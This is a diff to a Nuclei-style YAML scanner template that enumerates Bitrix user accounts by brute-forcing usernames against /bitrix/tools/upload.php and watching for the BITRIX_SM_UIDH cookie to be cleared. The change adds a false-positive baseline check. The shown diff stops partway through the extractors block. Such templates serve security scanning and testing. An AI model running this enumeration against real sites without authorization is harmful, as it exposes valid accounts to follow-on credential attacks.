@@ -2,45 +2,69 @@ id: bitrix-account-enumeration-uidh
 
 info:
   name: Bitrix Account Enumeration via BITRIX_SM_UIDH
-  author: JhonnyBonny
+  author: JhonnyBonny,krolchonok
   severity: medium
   description: |
-    Bitrix reveals whether a login exists by clearing BITRIX_SM_UIDH when
-    BITRIX_SM_UIDL is set to a valid username. Enumerates accounts using a
-    Unix / common-service username wordlist.
+    Bitrix may reveal whether a login exists by clearing BITRIX_SM_UIDH when
+    BITRIX_SM_UIDL is a valid username.
+
+    False-positive guard: first probes a random non-existent login. If that
+    already returns BITRIX_SM_UIDH=deleted, the host always clears the cookie
+    and the technique is skipped (no wordlist brute).
   reference:
     - https://github.com/cr1f/writeups/blob/main/attacking_bitrix.pdf
+    - https://hackyourmom.com/en/kibervijna/audyt-bitrix-fundament-rozvidka-ta-pochatkovi-tochky-ataky-chastyna-1/
   metadata:
-    max-request: 250
+    max-request: 251
   tags: bitrix,bitrix24,enum,exposure
 
+variables:
+  # impossible login for calibration
+  bogus_user: "{{to_lower(rand_text_alpha(16))}}_no_such_user"
+
+flow: http(1) && http(2)
+
 http:
+  # 1) Baseline — technique must NOT fire for a random user
+  - raw:
+      - |
+        GET /bitrix/tools/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cookie: BITRIX_SM_UIDL={{bogus_user}}; BITRIX_SM_UIDH=1;
+        Connection: close
+
+    disable-cookie: true
+
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?i)Set-Cookie:\s*BITRIX_SM_UIDH=deleted'
+        negative: true
+        internal: true
+
+  # 2) Wordlist only if baseline is clean
   - raw:
       - |
         GET /bitrix/tools/upload.php HTTP/1.1
         Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Cookie: BITRIX_SM_UIDL={{username}}; BITRIX_SM_UIDH=1;
+        Connection: close
 
+    disable-cookie: true
     payloads:
       username: wordlists/unix_users.txt
-
     attack: batteringram
     threads: 10
 
     matchers-condition: and
     matchers:
-      - type: word
+      - type: regex
         part: header
-        words:
-          - "BITRIX_SM_UIDH=deleted"
-
-      - type: status
-        status:
-          - 200
-          - 403
-          - 500
-        condition: or
+        regex:
+          - '(?i)Set-Cookie:\s*BITRIX_SM_UIDH=deleted'
 
     extractors:
       - type: dsl
